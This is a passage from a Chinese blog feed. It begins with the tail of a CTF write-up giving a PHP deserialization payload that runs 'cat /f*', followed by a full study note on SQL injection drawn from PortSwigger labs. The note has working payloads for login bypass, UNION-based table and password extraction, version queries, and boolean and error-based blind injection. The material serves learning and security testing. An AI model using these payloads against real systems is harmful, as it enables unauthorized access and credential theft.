class="string">&quot;system(&#x27;cat /f*&#x27;);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure></div>
<p>然后get传入这个序列化字符串就行</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL漏洞学习笔记</title>
    <url>/posts/21833.html</url>
    <content><![CDATA[<p>bp实验室SQL漏洞学习笔记 (示例使用的是Oracle数据库)</p>
<span id="more"></span>
<h2 id="什么是SQL注入-sqli"><a href="#什么是SQL注入-sqli" class="headerlink" title="什么是SQL注入(sqli)"></a>什么是SQL注入(sqli)</h2><p>sql注入指的是针对服务器的数据库进行攻击的一种手段，通过对数据库的干扰，让攻击者可以看到一些敏感的信息，包括其他用户的信息，密码，信用卡，个人信息等，在很多情况下还可以修改和删除数据。在某些情况下，攻击者可以获得进入组织系统的持久后门，从而导致长期入侵，并且可能在很长一段时间内都不会被发现。</p>
<h2 id="如何检测"><a href="#如何检测" class="headerlink" title="如何检测"></a>如何检测</h2><p>可以使用手动检测sql漏洞，通常可以利用一下几种方式：</p>
<ul>
<li>单引号<code>&#39;</code>查找异常</li>
<li>通过sql的基础语法，在入口点对不同的值做出评估，找出不同</li>
<li>布尔条件，比如<code>OR 1=1``OR 1=2</code>判断有什么不同</li>
<li>通过时间判断，通过触发sql时间延迟的payload来找到响应时间的差异</li>
<li>通过OAST外带网络，看是否可以与外部网络进行交互</li>
</ul>
<p>大多数的SQL漏洞都发生在<code>WHERE</code> 和 <code>SELECT</code>语句<br>但是，SQL 注入漏洞可能发生在查询中的任何位置，以及不同的查询类型中。SQL 注入出现的其他一些常见位置包括：</p>
<ul>
<li>在UPDATE语句中，在更新的值或WHERE子句内。</li>
<li>在INSERT语句中，在插入的值内。</li>
<li>在SELECT语句中，在表或列名称内。</li>
<li>在SELECT语句中，在ORDER BY子句内。</li>
</ul>
<h2 id="SQL注入示例"><a href="#SQL注入示例" class="headerlink" title="SQL注入示例"></a>SQL注入示例</h2><p>下面是一些常见的SQL注入示例<br>包括 检索隐藏数据  修改应用逻辑判断（通过查询语句来干扰程序的逻辑）union攻击（查询不同的数据表）  盲sql（sql没有回显）</p>
<h3 id="检索隐藏数据"><a href="#检索隐藏数据" class="headerlink" title="检索隐藏数据"></a>检索隐藏数据</h3><p>比如现在你要对一个商品的种类进行查询，你发送的请求大概是</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DTS"><figure class="iseeu highlight /dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//insecure-website.com/products?category=Gifts</span></span><br></pre></td></tr></table></figure></div>
<p>这就会让程序执行数据库查询</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category = <span class="string">&#x27;Gifts&#x27;</span> <span class="keyword">AND</span> released = <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>这就让数据返回<br><code>*</code> : 所有数据  <code>products</code> : 来自这个表里的内容 <code>category = &#39;Gifts&#39;</code> : 查询种类为Gifts的数据 <code>released = 1</code> : 可能是对用户查询的限制，比如未发售的产品released&#x3D;0</p>
<p>如果这个网站没有进行任何的sql注入防御,就会造成以下攻击</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="OXYGENE"><figure class="iseeu highlight /oxygene"><table><tr><td class="code"><pre><span class="line">https:<span class="comment">//insecure-website.com/products?category=Gifts&#x27;--</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category = <span class="string">&#x27;Gifts&#x27;</span>--<span class="string">&#x27; AND released = 1</span></span><br></pre></td></tr></table></figure></div>
<p>当这个查询语句被拼接上去时，<code>&#39;</code>会先闭合引号，<code>--</code>是sql的注释符，就会把后面的<code>AND released = 1</code>注释掉，这样子用户就可以访问到所有的商品，包括没有发布的，还可以查询所有类型的商品</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">https</span>://insecure-website.com/products?category=Gifts&#x27;+OR+<span class="number">1</span>=<span class="number">1</span>--</span><br></pre></td></tr></table></figure></div>
<p>修改后的查询将返回category为Gifts或1等于1所有项目。由于1&#x3D;1始终为真，因此查询将返回所有项目。<br>但是要注意：<br>将条件OR 1&#x3D;1注入 SQL 查询时要小心谨慎。即使在 注入的上下文中看起来无害，应用程序在多个不同的查询中使用来自单个请求的数据也很常见。<br>例如，如果 的条件到达UPDATE或DELETE语句，则可能会导致意外的数据丢失。</p>
<h3 id="改变应用程序的逻辑"><a href="#改变应用程序的逻辑" class="headerlink" title="改变应用程序的逻辑"></a>改变应用程序的逻辑</h3><p>比如一个程序是让用户通过用户名和密码登录，如果用户提交用户名wiener和密码bluecheese ，则应用程序通过执行以下 SQL 查询来检查凭据：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username = <span class="string">&#x27;wiener&#x27;</span> <span class="keyword">AND</span> <span class="keyword">password</span> = <span class="string">&#x27;bluecheese&#x27;</span></span><br></pre></td></tr></table></figure>
<p>在这种情况下，攻击者可以以任何用户身份登录，而无需密码。他们可以使用 SQL 注释序列–从查询的WHERE子句中删除密码检查。例如，提交用户名administrator’–和空白密码会导致以下查询：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username = <span class="string">&#x27;administrator&#x27;</span>--<span class="string">&#x27; AND password = &#x27;</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>


<h3 id="从其他数据表检索信息-UNION攻击"><a href="#从其他数据表检索信息-UNION攻击" class="headerlink" title="从其他数据表检索信息 (UNION攻击)"></a>从其他数据表检索信息 (UNION攻击)</h3><p>如果应用程序以 SQL 查询结果作为响应，攻击者可以利用 SQL 注入漏洞从数据库内的其他表中检索数据<br>利用<code>UNION</code>关键字可以执行额外的查询<br>例如，如果应用程序执行包含用户输入Gifts的以下查询：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="type">name</span>, description <span class="keyword">FROM</span> products <span class="keyword">WHERE</span> category = <span class="string">&#x27;Gifts&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>攻击者可以执行以下的查询</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">&#x27; UNION <span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> users--</span><br></pre></td></tr></table></figure>
<p>这会导致应用程序返回所有用户名和密码以及产品名称和描述。</p>
<p>为了使UNION查询正常工作，必须满足两个关键要求：</p>
<ul>
<li>各个查询必须返回相同数量的列。</li>
<li>每列中的数据类型必须在各个查询之间兼容。<br>要执行 SQL 注入 UNION 攻击，要确保攻击满足以下两个要求</li>
<li>原始查询返回了多少列。</li>
<li>从原始查询返回的哪些列具有合适的数据类型来保存注入查询的结果。</li>
</ul>
<h4 id="确定所需的列数"><a href="#确定所需的列数" class="headerlink" title="确定所需的列数"></a>确定所需的列数</h4><p>执行 SQL 注入 UNION 攻击时，有两种有效的方法可以确定从原始查询返回了多少列。<br>一种方法是注入一系列ORDER BY子句并增加指定的列索引，直到发生错误。例如，如果注入点是原始查询的WHERE子句中的带引号的字符串，则应提交：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRMSH"><figure class="iseeu highlight /crmsh"><table><tr><td class="code"><pre><span class="line">&#x27; <span class="keyword">ORDER</span> <span class="title">BY</span> <span class="number">1</span>--</span><br><span class="line">&#x27; <span class="keyword">ORDER</span> <span class="title">BY</span> <span class="number">2</span>--</span><br><span class="line">&#x27; <span class="keyword">ORDER</span> <span class="title">BY</span> <span class="number">3</span>--</span><br><span class="line">etc.</span><br></pre></td></tr></table></figure></div>
<p>ORDER BY子句中的列可以通过其索引指定，因此 不需要知道任何列的名称。当指定的列索引超出结果集中的实际列数时，数据库将返回错误，例如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="FORTRAN"><figure class="iseeu highlight /fortran"><table><tr><td class="code"><pre><span class="line">The ORDER BY <span class="keyword">position</span> <span class="keyword">number</span> <span class="number">3</span> is <span class="keyword">out</span> of <span class="built_in">range</span> of the <span class="keyword">number</span> of items <span class="keyword">in</span> the <span class="keyword">select</span> list.</span><br></pre></td></tr></table></figure></div>
<p>应用程序实际上可能会在其 HTTP 响应中返回数据库错误，但也可能发出一般错误响应。在其他情况下，它可能根本不返回任何结果。无论哪种情况，只要 可以检测到响应中的一些差异，就可以推断出查询返回了多少列。<br>第二种方法涉及提交一系列指定不同数量的空值的UNION SELECT：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">&#x27; <span class="built_in">UNION</span> <span class="built_in">SELECT</span> <span class="built_in">NULL</span>--</span><br><span class="line">&#x27; <span class="built_in">UNION</span> <span class="built_in">SELECT</span> <span class="built_in">NULL</span>,<span class="built_in">NULL</span>--</span><br><span class="line">&#x27; <span class="built_in">UNION</span> <span class="built_in">SELECT</span> <span class="built_in">NULL</span>,<span class="built_in">NULL</span>,<span class="built_in">NULL</span>--</span><br><span class="line">etc.</span><br></pre></td></tr></table></figure></div>
<p>如果空值的数量与列数不匹配，数据库将返回错误，例如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">All</span> queries combined <span class="keyword">using</span> a <span class="keyword">UNION</span>, <span class="keyword">INTERSECT</span> <span class="keyword">or</span> <span class="keyword">EXCEPT</span> <span class="keyword">operator</span> must have an equal number <span class="keyword">of</span> expressions <span class="keyword">in</span> their target lists.</span><br></pre></td></tr></table></figure></div>
<p>我们使用NULL作为注入的SELECT查询的返回值，因为每列中的数据类型必须在原始查询和注入查询之间兼容.NULL可转换为每种常见数据类型，因此当列数正确时，它可以最大限度地提高payload成功的机会。<br><img src="https://pic1.imgdb.cn/item/67c84d88d0e0a243d40cdb3b.png"><br>这里就是有三列，所以输入三个NULL，可以正常访问，输入其他数量的NULL就无法访问到商品数据</p>
<h4 id="数据库特定的语法"><a href="#数据库特定的语法" class="headerlink" title="数据库特定的语法"></a>数据库特定的语法</h4><p>在 Oracle 上，每个SELECT查询都必须使用FROM关键字并指定一个有效的表。Oracle 上有一个名为dual内置表可用于此目的。因此，Oracle 上的注入查询需要如下所示：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">&#x27; <span class="built_in">UNION</span> <span class="built_in">SELECT</span> <span class="built_in">NULL</span> FROM DUAL--</span><br></pre></td></tr></table></figure></div>
<p>在 MySQL 上，双破折号序列后面必须有一个空格。或者，可以使用井号#来标识注释。<br>sql注入速查表：<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
<h4 id="查找具有有用数据类型的列"><a href="#查找具有有用数据类型的列" class="headerlink" title="查找具有有用数据类型的列"></a>查找具有有用数据类型的列</h4><p>SQL 注入 UNION 攻击可让 检索注入查询的结果。 想要检索的有趣数据通常为字符串形式。这意味着 需要在原始查询结果中找到一个或多个数据类型为字符串数据或与字符串数据兼容的列。<br>确定所需列数后， 可以探测每列以测试其是否可以容纳字符串数据。 可以提交一系列UNION SELECT，依次将字符串值放入每列中。例如，如果查询返回四列，则 可以提交：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VHDL"><figure class="iseeu highlight /vhdl"><table><tr><td class="code"><pre><span class="line">&#x27; UNION <span class="keyword">SELECT</span> <span class="symbol">&#x27;a</span>&#x27;,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line">&#x27; UNION <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="symbol">&#x27;a</span>&#x27;,<span class="keyword">NULL</span>,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line">&#x27; UNION <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="symbol">&#x27;a</span>&#x27;,<span class="keyword">NULL</span><span class="comment">--</span></span><br><span class="line">&#x27; UNION <span class="keyword">SELECT</span> <span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="symbol">&#x27;a</span>&#x27;<span class="comment">--</span></span><br></pre></td></tr></table></figure></div>
<p>如果列数据类型与字符串数据不兼容，则注入的查询将导致数据库错误，如果没有发生错误，并且应用程序的响应包含一些额外的内容（包括注入的字符串值），那么相关列适合检索字符串数据。</p>
<h4 id="使用-SQL-注入-UNION-攻击来检索有趣的数据"><a href="#使用-SQL-注入-UNION-攻击来检索有趣的数据" class="headerlink" title="使用 SQL 注入 UNION 攻击来检索有趣的数据"></a>使用 SQL 注入 UNION 攻击来检索有趣的数据</h4><p>当 确定了原始查询返回的列数并发现哪些列可以保存字符串数据时， 就可以检索有趣的数据。<br>现在假设：1.原始查询返回两列，并且两列都可以保存字符串吗。2.注入点是WHERE子句内的带引号的字符串。3.数据库包含一个名为users表，其中包含username和password 。</p>
<p>所以sql注入的语句可以是</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">&#x27; UNION <span class="keyword">SELECT</span> username, <span class="keyword">password</span> <span class="keyword">FROM</span> users--</span><br></pre></td></tr></table></figure>
<p>为了执行此攻击， 需要知道有一个名为users的表，其中包含两列，分别称为username和password 。如果没有这些信息， 将不得不猜测表和列的名称。所有现代数据库都提供了检查数据库结构并确定它们包含哪些表和列的方法。</p>
<h4 id="检索单个列中的多个值"><a href="#检索单个列中的多个值" class="headerlink" title="检索单个列中的多个值"></a>检索单个列中的多个值</h4><p>在某些情况下，上例中的查询可能仅返回单个列。可以通过将值连接在一起来检索此单个列中的多个值。 可以添加分隔符来区分组合的值。例如，在 Oracle 上， 可以提交输入：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line">&#x27; UNION <span class="keyword">SELECT</span> username || <span class="string">&#x27;~&#x27;</span> || <span class="keyword">password</span> <span class="keyword">FROM</span> users--</span><br></pre></td></tr></table></figure>
<p>这使用了双管道序列||这是 Oracle 上的字符串连接运算符。注入的查询将username和password字段的值连接在一起，以~字符分隔。<br>其他几个数据库的拼接语句</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Microsoft</span>  <span class="string">&#x27;foo&#x27;</span>+<span class="string">&#x27;bar&#x27;</span></span><br><span class="line">PostgreSQL  <span class="string">&#x27;foo&#x27;</span>||<span class="string">&#x27;bar&#x27;</span> </span><br><span class="line">            <span class="string">&#x27;foo&#x27;</span> <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">MySQL       <span class="string">&#x27;foo&#x27;</span> <span class="string">&#x27;bar&#x27;</span></span><br><span class="line">            CONCAT(<span class="string">&#x27;foo&#x27;</span>,<span class="string">&#x27;bar&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
<p>mysql除了concat还有group_concat也是很常用的拼接函数<br><img src="https://pic1.imgdb.cn/item/67c8631ad0e0a243d40ce355.png"><br>比如在这里先用UNION查询NULL知道有两列数据，然后查询字符串，知道只有第二列可以返回查询，然后就用oracle上面的拼接查询两个字段</p>
<h2 id="常见数据库中检查是否存在sql注入攻击"><a href="#常见数据库中检查是否存在sql注入攻击" class="headerlink" title="常见数据库中检查是否存在sql注入攻击"></a>常见数据库中检查是否存在sql注入攻击</h2><p>上面说完了sql注入示例，那现在当然要知道什么时候可以进行sql注入攻击，对于不同的数据库，方式也不同<br>要利用 SQL 注入漏洞，通常需要查找有关数据库的信息。 其中包括</p>
<ul>
<li>数据库软件的类型和版本。</li>
<li>数据库包含的表和列。</li>
</ul>
<h3 id="查询数据库类型和版本"><a href="#查询数据库类型和版本" class="headerlink" title="查询数据库类型和版本"></a>查询数据库类型和版本</h3><p>以下是一些用于确定某些流行数据库类型的数据库版本的查询：<br>Microsoft, MySQL  SELECT @@version<br>Oracle   SELECT * FROM v$version<br>        SELECT banner FROM v$version<br>          SELECT version FROM v$instance<br>PostgreSQL  SELECT version()<br>可以使用UNION攻击 （使用之前要先查在哪一列回显信息）</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">&#x27; <span class="built_in">UNION</span> <span class="built_in">SELECT</span> <span class="comment">@@</span>version--</span><br></pre></td></tr></table></figure></div>
<p>在 Oracle 数据库上，每个SELECT语句都必须指定要从FROM选择的表。 如果 的UNION SELECT攻击不从表中查询， 仍然需要包含FROM关键字，后跟有效的表名。<br>Oracle 中有一个名为dual内置表</p>
<h3 id="列出数据库的内容"><a href="#列出数据库的内容" class="headerlink" title="列出数据库的内容"></a>列出数据库的内容</h3><p>大多数数据库类型（Oracle 除外）都有一组称为信息模式的视图。它提供有关数据库的信息。<br>例如， 可以查询information_schema.tables来列出数据库中的表：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line">SELECT * FROM information_schema.tables</span><br><span class="line"></span><br><span class="line">TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE</span><br><span class="line"><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span><span class="operator">=</span></span><br><span class="line">MyDatabase     dbo           Products    BASE TABLE</span><br><span class="line">MyDatabase     dbo           Users       BASE TABLE</span><br><span class="line">MyDatabase     dbo           Feedback    BASE TABLE</span><br></pre></td></tr></table></figure></div>
<p>然后， 可以查询information_schema.columns来列出各个表中的列：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> information_schema.<span class="keyword">columns</span> <span class="keyword">WHERE</span> <span class="built_in">table_name</span> = <span class="string">&#x27;Users&#x27;</span></span><br></pre></td></tr></table></figure></div>

<p>一半的步骤包括，确定字段数，判断有用数据类型的列，查表名，查列名，查询想要的信息</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;+UNION+SELECT+&#x27;</span>abc<span class="string">&#x27;,&#x27;</span>def<span class="string">&#x27;--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>+<span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+<span class="built_in">table_name</span>,+<span class="keyword">NULL</span>+<span class="keyword">FROM</span>+information_schema.<span class="keyword">tables</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=&#x27;</span>users_abcdef<span class="string">&#x27;--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span>+<span class="keyword">UNION</span>+<span class="keyword">SELECT</span>+username_abcdef,+password_abcdef+<span class="keyword">FROM</span>+users_abcdef<span class="comment">--</span></span><br></pre></td></tr></table></figure></div>

<p>在 Oracle 上， 可以找到如下相同的信息：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> all_tables</span><br><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> <span class="built_in">table_name</span> = <span class="string">&#x27;USERS&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p>其他类型的数据库的内容在sql速查表里面看<a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">https://portswigger.net/web-security/sql-injection/cheat-sheet</a></p>
<h2 id="sql盲注"><a href="#sql盲注" class="headerlink" title="sql盲注"></a>sql盲注</h2><p>什么是sql盲注？ 当应用程序的数据库查询的返回信息不回显在http响应的时候，但是又容易受到sql注入攻击，就叫做sql盲注。很多技术对sql盲注没有效果，比如uinon攻击，但是还是可以进行sql注入，通过别的方式</p>
<h3 id="通过触发条件响应进行盲sql注入"><a href="#通过触发条件响应进行盲sql注入" class="headerlink" title="通过触发条件响应进行盲sql注入"></a>通过触发条件响应进行盲sql注入</h3><p>假设有一个应用程序使用跟踪 Cookie 来收集使用情况分析数据。对该应用程序的请求包含如下 Cookie 标头：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">Cookie: <span class="attribute">TrackingId</span>=u5YD3PapBcR4lN3e7Tj4</span><br></pre></td></tr></table></figure></div>

<p>当处理包含TrackingId cookie 的请求时，应用程序使用 SQL 查询来确定这是否是已知用户：</p>
<figure class="highlight n1ql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TrackingId <span class="keyword">FROM</span> TrackedUsers <span class="keyword">WHERE</span> TrackingId = <span class="string">&#x27;u5YD3PapBcR4lN3e7Tj4&#x27;</span></span><br></pre></td></tr></table></figure>

<p>此查询容易受到 SQL 注入攻击，但查询结果不会返回给用户。不过，应用程序的行为会根据查询是否返回任何数据而有所不同。如果 提交已识别的TrackingId ，查询将返回数据， 会在响应中收到“欢迎回来”消息。</p>
<p>所以就可以利用这种条件来进行sql注入，通过触发不同的响应来检索信息<br>假设发送了两个请求，其中依次包含以下TrackingId cookie 值：</p>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">…xyz&#x27; AND &#x27;<span class="number">1</span>&#x27;=&#x27;<span class="number">1</span></span><br><span class="line">…xyz&#x27; AND &#x27;<span class="number">1</span>&#x27;=&#x27;<span class="number">2</span>  </span><br></pre></td></tr></table></figure>
<p>这些值中的第一个值导致查询返回结果，因为注入的AND ‘1’&#x3D;’1条件为真。结果，显示“欢迎回来”消息。<br>第二个值导致查询不返回任何结果，因为注入的条件为假。不显示“欢迎回来”消息。</p>
<p>例如，假设有一个名为Users的表，其中包含Username和Password列，以及一个名为Administrator的用户。 可以通过发送一系列输入来一次一个字符地测试密码，从而确定此用户的密码。</p>
<p>这使我们能够确定任何单个注入条件的答案，并一次提取一个数据。</p>
<p>例如，假设有一个名为Users的表，其中包含Username和Password列，以及一个名为Administrator的用户。 可以通过发送一系列输入来一次一个字符地测试密码，从而确定此用户的密码。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">xyz<span class="string">&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;</span>Administrato<span class="string">r&#x27;), 1, 1) &gt; &#x27;</span>m</span><br></pre></td></tr></table></figure></div>

<p>这将返回“欢迎回来”消息，表明注入的条件为真，因此密码的第一个字符大于m 。</p>
<p>最终，我们发送以下输入，返回“欢迎回来”消息，从而确认密码的第一个字符是s ：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">xyz<span class="string">&#x27; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#x27;</span>Administrato<span class="string">r&#x27;), 1, 1) = &#x27;</span>s</span><br></pre></td></tr></table></figure></div>
<p>我们可以继续这个过程，系统地确定Administrator用户的完整密码。</p>
<p><img src="https://pic1.imgdb.cn/item/67c9c8d1066befcec6df56bb.png"><br>比如在这个例子中，我们根据返回的内容是否有welcome判断，然后判断出了有users表和administrator这个用户，用条件响应来确定密码的长度<br><img src="https://pic1.imgdb.cn/item/67c9ced3066befcec6df57d6.png"><br>然后用substring这个函数，截取密码里面的一个字，在substring的第一个数字和最后的’a’加上攻击符，进行判断，然后逐位爆破出密码</p>
<h3 id="基于错误的-SQL-注入"><a href="#基于错误的-SQL-注入" class="headerlink" title="基于错误的 SQL 注入"></a>基于错误的 SQL 注入</h3><p>基于错误的 SQL 注入是指 能够使用错误消息从数据库中提取或推断敏感数据的情况，即使在盲目情况下也是如此。可能性取决于数据库的配置和 能够触发的错误类型：</p>
<h4 id="通过触发条件错误来利用盲-SQL-注入"><a href="#通过触发条件错误来利用盲-SQL-注入" class="headerlink" title="通过触发条件错误来利用盲 SQL 注入"></a>通过触发条件错误来利用盲 SQL 注入</h4><p>某些应用程序执行 SQL 查询，但无论查询是否返回任何数据，其行为都不会改变。上一节中的技术不起作用，因为注入不同的布尔条件不会对应用程序的响应产生影响。<br>通常，可以根据是否发生 SQL 错误来诱导应用程序返回不同的响应。 可以修改查询，使其仅在条件为真时才导致数据库错误。通常，数据库抛出的未处理错误会导致应用程序的响应有所不同，例如错误消息。这使 能够推断出注入条件的真实性。<br>假设发送了两个请求，它们分别包含以下TrackingId cookie 值：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">xyz&#x27; <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span>=<span class="number">2</span>) <span class="keyword">THEN</span> <span class="number">1</span>/<span class="number">0</span> <span class="keyword">ELSE</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">END</span>)=<span class="symbol">&#x27;a</span></span><br><span class="line">xyz&#x27; <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="number">1</span>=<span class="number">1</span>) <span class="keyword">THEN</span> <span class="number">1</span>/<span class="number">0</span> <span class="keyword">ELSE</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">END</span>)=<span class="symbol">&#x27;a</span></span><br></pre></td></tr></table></figure></div>
<p>这些输入使用CASE关键字来测试条件，并根据表达式是否为真返回不同的表达式</p>
<ul>
<li>对于第一个输入， CASE表达式计算结果为’a’ ，这不会导致任何错误。</li>
<li>对于第二个输入，其计算结果为1&#x2F;0 ，这会导致除以零的错误。<br>如果错误导致应用程序的 HTTP 响应出现差异，则可以由此确定注入的条件是否为真。</li>
</ul>
<p>通过这个方法可以一次确定一个字符</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">xyz<span class="string">&#x27; AND (SELECT CASE WHEN (Username = &#x27;</span>Administrato<span class="string">r&#x27; AND SUBSTRING(Password, 1, 1) &gt; &#x27;</span>m<span class="string">&#x27;) THEN 1/0 ELSE &#x27;</span>a<span class="string">&#x27; END FROM Users)=&#x27;</span>a</span><br></pre></td></tr></table></figure></div>
<p>利用方式和上一题也很像，只是我们观察返回有没有错误<br><img src="https://pic1.imgdb.cn/item/67ca608b066befcec6dfa0b9.png"><br>q954u104nkbmrmvdwvft</p>
